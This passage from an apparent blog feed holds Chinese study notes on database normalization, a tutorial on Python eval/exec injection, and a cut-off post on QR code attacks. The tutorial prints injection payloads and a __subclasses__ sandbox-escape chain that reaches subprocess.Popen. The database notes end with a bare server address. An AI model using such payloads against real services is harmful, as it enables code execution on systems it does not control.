title="数据库设计的其他方面"></a>数据库设计的其他方面</h4><ul><li>数据约束<ul><li>识别约束、描述约束、在模式实际中实现约束</li></ul></li><li>性能考虑<ul><li>吞吐量，响应时间的需求分析与相关设计考虑</li><li>索引设计：索引对查询和更新效率的影响</li></ul></li><li>授权</li><li>工作流<ul><li>流程分析和设计是应用系统开发的重要环节</li><li>工作流管理系统（WFMS）是流程管理的重要平台</li><li>WFMS是一个专业领域，本身并不属于数据库领域</li></ul></li><li>其他：考虑将来可能的变迁</li></ul><h2 id="关系数据库设计"><a href="#关系数据库设计" class="headerlink" title="关系数据库设计"></a>关系数据库设计</h2><h3 id="好的关系设计特点"><a href="#好的关系设计特点" class="headerlink" title="好的关系设计特点"></a>好的关系设计特点</h3><ul><li><h4 id="RDB设计工程方法的代表：E-R图方法"><a href="#RDB设计工程方法的代表：E-R图方法" class="headerlink" title="RDB设计工程方法的代表：E-R图方法"></a>RDB设计工程方法的代表：E-R图方法</h4><ul><li>绘制E-R图</li><li>E-R图 → RDB模式</li><li>模式优化</li></ul></li><li><h4 id="RDB设计工程方法的问题"><a href="#RDB设计工程方法的问题" class="headerlink" title="RDB设计工程方法的问题"></a>RDB设计工程方法的问题</h4><ul><li>E-R质量和分析员的能力水平相关</li><li>E-R质量难以保证，致使E-R方法设计质量难以保证</li><li>其他RDB模式工程设计方法存在类似的问题</li></ul></li><li><h4 id="质量保证"><a href="#质量保证" class="headerlink" title="质量保证"></a>质量保证</h4><ul><li>质量保证 vs 高质量</li><li>工程方法质量保证困难，受工程人员能力影响大</li><li>质量保证常用方法：机械化、形式化</li></ul></li><li><h4 id="关系模式规范化研究背景"><a href="#关系模式规范化研究背景" class="headerlink" title="关系模式规范化研究背景"></a>关系模式规范化研究背景</h4><ul><li>为提高RDB设计质量保证，国外学者探寻和研究形式化的RDB设计方法</li><li>提出和完善了：关系模式规范化理论和方法</li><li>希望按照规范化理论和方法， 能够进行有质量保证的RDB设计</li></ul></li><li><h4 id="关系模式规范化的基本思路"><a href="#关系模式规范化的基本思路" class="headerlink" title="关系模式规范化的基本思路"></a>关系模式规范化的基本思路</h4><ul><li>泛关系：Universal Relation</li><li>数据间的约束</li><li>按照机械算法，得到好的关系模式</li></ul></li></ul><h4 id="关系模式规范化理论和方法"><a href="#关系模式规范化理论和方法" class="headerlink" title="关系模式规范化理论和方法"></a>关系模式规范化理论和方法</h4><ul><li>模式规范化方法的研究状况<ul><li>提出了模式规范化的标准：1NF，2NF，3NF，BCNF，4NF，5NF，6NF</li><li>给出了泛关系分解到具体范式的算法</li><li>算法多为NP算法，无法实际执行</li></ul></li><li>规范化方法学习价值<ul><li>理解不同范式的优缺点</li><li>理解相应的模式改进方法</li><li>作为重要指导思想指导模式设计</li></ul></li></ul><h4 id="设计选择"><a href="#设计选择" class="headerlink" title="设计选择"></a>设计选择</h4><ul><li>更小的模式：连接不起来表——有损分解</li><li>更大的模式：信息重复</li></ul><p>有损分解：分解范式之后，自然连接不能重构表</p><p>无损分解：分解之后，自然连接能重构表</p><ul><li>好的关系模式<ul><li>该大则大，该小则小</li><li>同数据本质结构相吻合</li><li>不必存储不必要的重复信息，同时又可以方便地获取信息</li></ul></li><li>如何得到好的关系模式<ul><li>工程化方法</li><li>模式规范化</li></ul></li></ul><h3 id="原子域和第一范式"><a href="#原子域和第一范式" class="headerlink" title="原子域和第一范式"></a>原子域和第一范式</h3><ul><li><strong>原子域</strong>：域元素被认为是不可分的单元，称域是原子的。</li></ul><ul><li><strong>第一范式</strong>：称一个关系模式R属于第一范式，如果R的所有属性域都是原子的。</li></ul><p>非原子值是的存储变复杂并且导致数据存贮的冗余</p><blockquote><p>决定一个特定关系R是不是一个好的形式</p><p>若一个关系R不是好的形式，将他分解为一系列关系 {R1，R2，… ，Rn}，使得</p><ul><li>每个关系是形式良好的</li><li>分解是无损的</li></ul></blockquote><blockquote><p>基础理论：</p><ul><li>函数依赖</li><li>多值依赖</li></ul></blockquote><h3 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h3><p>函数依赖是在合法关系集合上的约束，要求一个特定的属性集合的值唯一决定另一个属性集合的值</p><p>一个函数依赖是一个码标识的概化</p><p>考虑一个关系模式R， <code>α ∈ R and β ∈ R</code> ，函数依赖 <code>α → β</code> 满足的条件是对实例中所有元组对t1和t2，有 <code>t1[α] = t2[α] ⟹ t1[β] = t2[β]</code> 。如果R的每个合法实例r都满足函数依赖  <code>α → β</code>  ，则我们说该函数依赖在模式R上成立。</p><ul><li>如果函数依赖 K → R 在R上成立，则K是R的一个超码。</li><li>K是R的候选码当且仅当 ① K → R；② 不存在 α ⊂ K，α → R。</li></ul><h4 id="函数依赖的使用"><a href="#函数依赖的使用" class="headerlink" title="函数依赖的使用"></a>函数依赖的使用</h4><ul><li>利用函数依赖<ul><li>判断关系的实例是否满足给定函数依赖集F<ul><li>如果一个关系实例r在函数依赖集F下是合法的，那么r满足F</li></ul></li><li>说明合法关系集上的约束<ul><li>如果R上的所有合法关系都满足函数依赖集F，那么F在R上成立</li></ul></li><li>Note：即使一个函数依赖在所有实例上不成立，他可能在某个特定的关系模式实例上成立<br>例如，instructor上的一个特定实例，满足name → ID</li></ul></li></ul><ul><li>有些函数依赖称为平凡的，因为他们在所有关系中满足：<ul><li>一般的，如果 β ⊆ α ，α → β是平凡的</li></ul></li><li>平凡的函数依赖<ul><li>对所有的关系模式R，如果 β ⊆ α ，必有α → β</li><li>当 β ⊆ α 时，称 α → β 是平凡（trivial）的函数依赖</li><li>否则，称为 α → β 非平凡的函数依赖，称 α 是 β 的实质决定因素</li></ul></li></ul><blockquote><p>对立关系模式R(sno, sname, dno, dname)，下述函数依赖成立：</p><ul><li>sno → sname，dno，dname</li><li>sno，sname → dno</li><li>dno → dname</li></ul></blockquote><p>函数依赖是对关系模式的约束</p><ul><li>关系模式的表示：四元组 R（U，D，dom，F），F是R成立的函数依赖集合</li><li>关系模式简单表示为：R(F)</li></ul><h4 id="不成立的函数依赖"><a href="#不成立的函数依赖" class="headerlink" title="不成立的函数依赖"></a>不成立的函数依赖</h4><ul><li>对关系模式R(sno, sname, dno, dname)，下述函数依赖不成立：sname → sno<ul><li>函数依赖是对模式的约束</li><li>函数依赖必须是现实语义约束的反映</li><li>在一些具体的关系实例上，sname → sno成立</li></ul></li></ul><h4 id="函数依赖与码"><a href="#函数依赖与码" class="headerlink" title="函数依赖与码"></a>函数依赖与码</h4><ul><li>使用函数依赖码<ul><li>超码SuperKey：对关系模式R， α ⊆ R，如果 α → R，则α为超码</li><li>候选码CandidateKey：对关系模式R，α为超码，如果任意α的真子集β，β → R 不成立，则称α 为候选码</li></ul></li></ul><blockquote><p>例：对关系模式R(sno,sname,dno,dname)，下述函数依赖成立：①sno→R②sno,dno→R</p></blockquote><ul><li>实例满足的依赖 vs 模式上成立的依赖<ul><li>关系模式R(F)，如果 r ∈ R(F)，则<ol><li>R上成立的所有函数依赖，r必须满足；否则，称r ∉ R(F)</li><li>r上满足的函数依赖，R上不一定成立</li></ol></li></ul></li></ul><h4 id="函数依赖集合的闭包"><a href="#函数依赖集合的闭包" class="headerlink" title="函数依赖集合的闭包"></a>函数依赖集合的闭包</h4><p>给定函数依赖集F，必定有一些其他的函数依赖被F逻辑蕴含，例如：如果A→B且B→C，那么可推断A→C</p><p>能够从给定F集合推导出的所有函数依赖的集合称为F的闭包</p><p>使用F<sup>+</sup> 符号来表示F集合的闭包</p><p>F<sup>+</sup>是F的一个超集</p><h3 id="Boyce-Codd-范式"><a href="#Boyce-Codd-范式" class="headerlink" title="Boyce-Codd 范式"></a>Boyce-Codd 范式</h3><p>具有函数依赖集F的关系模式R属于BCNF的条件是，对F<sup>+</sup>中所有形如 α → β 的函数依赖，下面至少有一项成立：</p><ul><li>α → β 是平凡的函数依赖（即 β ⊆ α）</li><li>α 是模式R的一个超码</li></ul><blockquote><p>1NF是指数据库表的每一列都是不可分割的基本数据项，即实体中的某个属性不能有多个值或者不能有重复的属性。</p><p>2NF要求属性完全依赖于主键，不能存在仅依赖主关键字一部分的属性。</p><p>3NF要求每一个非主属性既不部分依赖于码也不传递依赖于码。</p><p>BCNF消除了主属性对候选码的部分和传递函数依赖。</p><p>1、第一范式（1NF）：一个关系模式R的所有属性都是不可分的基本数据项，原子的。</p><p>2、第二范式（2NF）：满足第一范式，然后消除部分依赖。</p><p>3、第三范式（3NF）： 满足第二范式，消除传递依赖。</p></blockquote><h5 id="BCNF的本质"><a href="#BCNF的本质" class="headerlink" title="BCNF的本质"></a>BCNF的本质</h5><ul><li>（在只考虑函数依赖的前提上）只讲一件事</li><li>非码决定的那个因素的相关决定关系讲述了另外一件事</li><li>多个码是一件事的不同方面，本质上仍是一件事</li></ul><p>所有的二元联系都是BCNF</p><p>BCNF和保持依赖：关系模式可以通过分解达到BCNF</p><p>DBMS检查函数依赖的开销很大 </p><p>将数据库设计成能够高效的检查约束是很有用的，如果函数依赖的检验仅需要考虑一个关系就可以完成，那么检查这种约束的开销就很低</p><p>BCNF的设计不是保持依赖的，由于常常希望保持依赖，因此考虑另外一种比BCNF弱的范式，它允许保持依赖，该范式称为第三范式</p><h4 id="第三范式"><a href="#第三范式" class="headerlink" title="第三范式"></a>第三范式</h4><p>关系模式R属于第三范式（3NF）的条件：对于所有 α → β in F<sup>*</sup> ，以下至少一项成立：</p><ul><li>α → β 是一个平凡的函数依赖（β ∈ α ）</li><li>α 是 R的一个超码</li><li>β - α 中的每个属性A都包含于R的一个候选码中（Note：每个属性A可能包含于不同的候选码中）</li></ul><p>任何满足BCNF的模式也满足3NF（因为他的每个函数依赖都将满足前两个条件中的一条）</p><p>在某种意义上，3NF的第三个条件代表BCNF条件最小放宽，以确保每一个模式都有保持依赖的3NF分解</p><h3 id="使用函数依赖进行分解"><a href="#使用函数依赖进行分解" class="headerlink" title="使用函数依赖进行分解"></a>使用函数依赖进行分解</h3><h3 id="函数依赖理论"><a href="#函数依赖理论" class="headerlink" title="函数依赖理论"></a>函数依赖理论</h3><h3 id="分解算法"><a href="#分解算法" class="headerlink" title="分解算法"></a>分解算法</h3><h3 id="使用多值依赖的分解"><a href="#使用多值依赖的分解" class="headerlink" title="使用多值依赖的分解"></a>使用多值依赖的分解</h3><h3 id="更多的范式"><a href="#更多的范式" class="headerlink" title="更多的范式"></a>更多的范式</h3><h3 id="数据库设计过程"><a href="#数据库设计过程" class="headerlink" title="数据库设计过程"></a>数据库设计过程</h3><h3 id="时态数据建模"><a href="#时态数据建模" class="headerlink" title="时态数据建模"></a>时态数据建模</h3><h2 id="数据存储和数据访问"><a href="#数据存储和数据访问" class="headerlink" title="数据存储和数据访问"></a>数据存储和数据访问</h2><h2 id="查询处理和查询优化"><a href="#查询处理和查询优化" class="headerlink" title="查询处理和查询优化"></a>查询处理和查询优化</h2><h2 id="事务管理-1"><a href="#事务管理-1" class="headerlink" title="事务管理"></a>事务管理</h2><p>查询代价</p><p>多值依赖</p><p>冲突串行化</p><p>211.87.227.230:3306</p><p>webteach</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> StudyNote </tag>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Functions with potential code execution risks in Python</title>
      <link href="/2019/12/30/Functions-with-potential-code-execution-risks-in-Python/"/>
      <url>/2019/12/30/Functions-with-potential-code-execution-risks-in-Python/</url>
      
        <content type="html"><![CDATA[<h1 id="Python中有潜在代码执行风险的函数"><a href="#Python中有潜在代码执行风险的函数" class="headerlink" title="Python中有潜在代码执行风险的函数"></a>Python中有潜在代码执行风险的函数</h1><blockquote><p>参考：</p><p> <a href="https://xz.aliyun.com/t/6902" target="_blank" rel="noopener">Python中有潜在代码执行风险的函数(一)</a></p></blockquote><p>在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。</p><h2 id="第一组"><a href="#第一组" class="headerlink" title="第一组"></a>第一组</h2><p>经典的两个存在执行代码隐患的函数 <code>eval()</code> 和 <code>exec()</code></p><p>在python中，<code>eval</code>和<code>exec</code> 的用法极其相似。<code>eval</code>和<code>exec</code>都可以将传入的字符串执行，但两者又有不同之处</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>eval是一个python内置函数，语法为<code>eval(expression, globals=None,locals=None)</code></p><p>eval函数接收三个参数：其中</p><ul><li><p><strong>expression</strong>参数是用做运算的字符串类型表达式；</p></li><li><p><strong>globals</strong>参数用于指定运行时的全局命名空间；</p></li><li><strong>Locals</strong>参数用于指定运行时的局部命名空间。</li></ul><p>globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。</p><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为<code>exec(object[, globals[,locals]])</code></p><p>exec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致。（所以eval通常可以当作是一个计算器，计算一串字符的值）</p><h4 id="对比："><a href="#对比：" class="headerlink" title="对比："></a>对比：</h4><ul><li><h5 id="在执行python语句上不同"><a href="#在执行python语句上不同" class="headerlink" title="在执行python语句上不同"></a>在执行python语句上不同</h5></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\1.jpg" alt></p><p><code>exec()</code>可以对变量a进行赋值，而<code>eval()</code>并不能对a进行赋值</p><p><code>exec()</code>可以执行python的<code>import os</code>，而<code>eval()</code>不能直接执行python语句，但是可以执行表达式<code>&#39;__import__(&quot;os&quot;)&#39;</code>并返回结果</p><blockquote><p><code>__import__()</code>函数用于动态加载类和函数，可以将该引入模块作为一个动态对象使用</p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\2.jpg" alt></p><p>相较于exec：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\3.jpg" alt></p><ul><li><h5 id="返回值不同"><a href="#返回值不同" class="headerlink" title="返回值不同"></a>返回值不同</h5></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\4.jpg" alt></p><p>由图可见，eval在对表达式进行计算后，返回计算结果，而exec并无返回结果</p><p>虽然有种种不同，但是还是会将第一个传入参数进行执行</p><h3 id="存在的安全隐患"><a href="#存在的安全隐患" class="headerlink" title="存在的安全隐患"></a>存在的安全隐患</h3><p>以<code>eval()</code>函数为例，下图中的add函数使用<code>eval()</code>对传入参数进行处理，将传入的a，b拼接起来通过<code>eval()</code>计算返回结果</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\5.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">4<span class="keyword">return</span> eval(<span class="string">"%s + %s"</span> % (a, b))</span><br></pre></td></tr></table></figure><p>通过eval进行执行表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">"__import__('os').system('whoami')"</span>, <span class="number">2</span>)</span><br><span class="line">eval(<span class="string">"__import__('os').system('whoami')"</span>)</span><br><span class="line">add(<span class="string">"__import__('os').system('whoami') #"</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\6.jpg" alt></p><p>成功执行命令，并返回结果2。</p><p>返回结果0是因为<code>os.system()</code>执行成功的话，返回值为0。</p><p>如同sql注入一样的思路，在执行语句后面加上注释，即可返回结果0。</p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>通过上面可知，只要eval或exec中的传入变量可控，就存在执行系统命令的问题</p><p>针对上面的例子<code>eval(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code>的问题，存在一种常见的限制方法：即指定<code>eval()</code>或<code>exec()</code>的<strong>globals</strong>参数为<code>{&#39;builtins&#39;:None}</code>或者<code>{&#39;builtins&#39;:{}}</code>这样的形式就可以避免任意代码执行的隐患。这种方法实际上是限制了他们可用的python内置模块(builtins)</p><p>在<code>eval()</code>和<code>exec()</code> ，<strong>globals</strong>参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\7.jpg" alt></p><p>如上图，若不规定globals参数，则使用python全局的<code>a=1</code>，若提供了globals参数<code>{&#39;a&#39;:6}</code>，则使用globals参数里的数据，即eval的作用域就是<code>{&#39;a&#39;:6}</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\8.jpg" alt></p><p>而且当eval使用了自己作用域里的参数，就不会使用python的全局命名空间</p><h4 id="python的builtins模块"><a href="#python的builtins模块" class="headerlink" title="python的builtins模块"></a>python的builtins模块</h4><p>builtins模块是提供对python的所有“内建”标识符的直接访问功能。python解释器在加载时会首先加载内建名称空间并自动导入所对应的内建函数，在执行python的时候加上<code>-v</code>的选择就可以看到加载过程。</p><blockquote><p><a href="https://blog.csdn.net/qq_33339479/article/details/81501802" target="_blank" rel="noopener">python源码分析——内建模块builtins初始化</a></p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\9.jpg" alt></p><p>而且由于<strong>builtins</strong>的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、<strong>import</strong> 等</p><p>通过命令<code>dir(__builtins__)</code>就可以看到所有的内建函数</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\10.jpg" alt></p><p>在python中使用上述函数都可以不用导入模块</p><p>回到<code>exec/eval</code>问题中，值得注意的是，在<code>exec/eval</code>中，若globals参数被提供，但是没有提供自定义的builtins，那么<code>exec/eval</code>会将当前环境中的<strong>builtins</strong>拷贝至自己提供的globals里，例子如下图：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\11.jpg" alt></p><p>如图，若globals里不规定<code>__builtins__</code>，则会使用python全局的<strong>builtins</strong>，例如<code>in[25]</code>。如果定义了builtins，则会使用已经定义的<strong>builtins</strong>，如<code>in[27]</code>和<code>in[28]</code>。</p><blockquote><p>这里我没搞懂26为什么也可以，因为builtins在python3.x的时候已经和builtin合并了。</p><p>后面实验时发现，builtins可以被当作模块所import，所以推测python初始化的时候使用的是<code>__builtins__</code>，实验证明这是正确的</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\12.jpg" alt></p></blockquote><p>exec的globals策略与eval相同</p><p>因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对<strong>import</strong>等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>在上述防范中，通过globals参数对<strong>builtins</strong>中的内置函数范围进行限制，使得eval/exec无法随意使用”<strong>import</strong>”等内置函数来达成阻止任意代码执行</p><p>但是却存在如下绕过：<code>(1, 2).class.bases[0].subclasses</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\13.jpg" alt></p><p>如图，<code>(1,2)</code>是一个元组，<code>__class__</code>用于查看对象所在的类，很显然<code>(1,2)</code>是个元组类型的对象，即tuple类</p><p><code>__bases__</code>属性返回所有直接父类所组成的元组（直接父类是因为python的多继承属性所导致）</p><p>如<code>In[36]</code>可见元组类型的直接父类是object类</p><p><code>__subclasses__</code> 可用来获取类的所有子类，贼恐怖</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\14.jpg" alt></p><p>因为<code>(1,2).__class__.__bases__[0]</code>已经是object类了，而object类的子类众多，因此可以使用的类就非常丰富了</p><p>比如list就在object类里，对应着<code>(1,2).__class__.__bases__[0].__subclasses__()[7]</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\15.jpg" alt></p><p>这样就可以调用list函数，将其转为一个list</p><p><strong>构造利用链的核心方法</strong>就是：只要追溯到object类并使用subclasses()使用object子类即可</p><p>在object子类中，有执行系统命令的子类  <code>subprocess.Popen</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\16.jpg" alt></p><blockquote><p>subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道，并且获取它们的返回码。</p><p><code>subprocess.Popen(args, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,stdout=subprocess.PIPE)</code></p><ul><li>args<br>被用作启动进程的参数. 可能是一个列表或字符串.</li><li>shell<br>（默认为 False）指定是否使用 shell 执行程序。如果 shell 为 True，更推荐将 args 作为字符串传递而非序列。</li><li>stdout<br>从子进程捕获到的标准输出. 一个字节序列, 或一个字符串, 如果 run() 是设置了 encoding, errors 或者 text=True 来运行的. 如果未有捕获, 则为 None.<br>如果你通过 stderr=subprocess.STDOUT 运行, 标准输入和标准错误将被组合在一起, 并且 stderr` 将为 None.</li><li>stderr<br>捕获到的子进程的标准错误. 一个字节序列, 或者一个字符串, 如果 run() 是设置了参数 encoding, errors 或者 text=True 运行的. 如果未有捕获, 则为 None.</li></ul><p><strong>简而言之</strong><br>上面代码简而言之就是，接受args的命令，执行成功就将执行成功的结果存入stdout管道，执行失败的结果存入stderr管道。</p></blockquote><p>显然，利用链：<code>().__class__.bases[0].__subclasses__()[176](&quot;whoami&quot;)</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\17.jpg" alt></p><p>可能由于我的引入库不同，导致了subclasses的列表选择不同，我在subclasses[217]找到<code>subprocess.Popen</code>，然后成功执行whoami命令</p><p>每个python的运行环境不同，引入库的顺序不同，导致subprocess不一定在176位，甚至可能没有被引入</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\18.jpg" alt></p><p>由图可见，虽然可能没被引入，但是这种方法能成功绕过。可见，虽然限制只允许使用list，但是我们仍然可以执行系统命令。因此，简单的使用{‘<strong>builtins</strong>‘: None}是无法满足eval的安全需求的</p><p>实际上，可以使用ast.literal_eval()来代替eval()</p><p>ast.literal_eval()允许传入的内容如下</p><p>strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None</p><p>当不合法的字符传入时，程序则会报错，如下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\19.jpg" alt></p><p>使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Functions-with-potential-code-execution-risks-in-Python\20.jpg" alt></p><p>甚至只要有任何不合法的字符传入，程序就会报错</p><p>使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞</p><blockquote><p>扩展：</p><p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">python沙箱逃逸</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QRCodeAttack</title>
      <link href="/2019/12/30/QRCodeAttack/"/>
      <url>/2019/12/30/QRCodeAttack/</url>
      
        <content type="html"><![CDATA[<h3 id="关于python的QRCode的用法"><a href="#关于python的QRCode的用法" class="headerlink" title="关于python的QRCode的用法"></a>关于python的QRCode的用法</h3><p>qrcode的用法</p><blockquote><p><a href="https://blog.csdn.net/cungudafa/article/details/85871871" target="_blank" rel="noopener">https://blog.csdn.net/cungudafa/article/details/85871871</a></p></blockquote><p>利用<code>zxing</code>模块读二维码数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_qrcode</span><span class="params">(data)</span>:</span></span><br><span class="line">    img = qrcode.make(data)</span><br><span class="line">    img.sava(<span class="string">"test.png"</span>)</span><br><span class="line">    im = Image.open(<span class="string">"test.png"</span>)</span><br><span class="line">    im.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_qrcode_zxing</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    logger = logging.getLogger(__name__)</span></span><br><span class="line"><span class="string">    if not logger.handlers: logging.basicConfig(level=logging.INFO)</span></span><br><span class="line"><span class="string">    DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == 'DEBUG')</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    img = Image.open(filename)</span><br><span class="line">    ran = int(random.random() * <span class="number">100000</span>)</span><br><span class="line">    img.save(<span class="string">'%s%s.jpg'</span> % (os.path.basename(filename).split(<span class="string">'.'</span>)[<span class="number">0</span>], ran))</span><br><span class="line">    zx = zxing.BarCodeReader()<span class="comment">#调用zxing二维码读取包</span></span><br><span class="line">    data = <span class="string">''</span></span><br><span class="line">    zxdata = zx.decode(<span class="string">'%s%s.jpg'</span> % (os.path.basename(filename).split(<span class="string">'.'</span>)[<span class="number">0</span>], ran))<span class="comment">#图片解码</span></span><br><span class="line">    <span class="comment"># 删除临时文件</span></span><br><span class="line">    os.remove(<span class="string">'%s%s.jpg'</span> % (os.path.basename(filename).split(<span class="string">'.'</span>)[<span class="number">0</span>], ran))</span><br><span class="line">    <span class="keyword">if</span> zxdata:</span><br><span class="line">        logger.debug(<span class="string">u'zxing识别二维码:%s,内容: %s'</span> % (filename, zxdata))</span><br><span class="line">        data = zxdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logger.error(<span class="string">u'识别zxing二维码出错:%s'</span> % (filename))</span><br><span class="line">        img.save(<span class="string">'%s-zxing.jpg'</span> % filename)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>但是，这只能识别标准的二维码，并不能识别图片中的二维码，由于这里需要用到tesseract，因此直接用二维码软件进行扫（注意不能用微信支付宝之类的，因为碰到url此类软件会直接跳转，好像QQ和一些第三方的扫码软件不会直接跳转url，而是显示其数据）</p><h3 id="乌云的二维码攻击"><a href="#乌云的二维码攻击" class="headerlink" title="乌云的二维码攻击"></a>乌云的二维码攻击</h3><blockquote><p> <a href="https://wooyun.js.org/drops/QR二维码的攻击方法与防御.html" target="_blank" rel="noopener">QR二维码的攻击方法与防御</a></p></blockquote><ol><li>网络钓鱼</li><li>诱导下载、传播恶意软件</li><li>隐私泄露</li></ol><h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h4><ol><li>QR码解码译码过程加入加解密环节</li><li>第三方统一管理</li></ol><h5 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h5><p>1.加入加解密环节：这只是确保了原二维码的数据的完整性，隐匿性，并不能确保其不被中间人攻击，即直接替换二维码的行为</p><h3 id="现有共享单车扫码探索"><a href="#现有共享单车扫码探索" class="headerlink" title="现有共享单车扫码探索"></a>现有共享单车扫码探索</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mobike</span>:</span><br><span class="line">4<span class="number">8650262688</span>: <span class="attribute">http</span>:<span class="comment">//www.mobike.com/download/app.html?b=8650262688_1</span></span><br><span class="line">4<span class="number">8641170177</span>: <span class="attribute">http</span>:<span class="comment">//www.mobike.com/download/app.html?b=8641170177_1</span></span><br><span class="line">4<span class="number">8641176319</span>:  <span class="attribute">http</span>:<span class="comment">//www.mobike.com/download/app.html?b=8641176319_1</span></span><br><span class="line">4</span><br><span class="line">hello <span class="attribute">bike</span>:</span><br><span class="line">4<span class="number">3110469617</span>:  <span class="attribute">http</span>:<span class="comment">//c3x.me/?n=3110469617</span></span><br><span class="line">4<span class="number">3110457021</span>:  <span 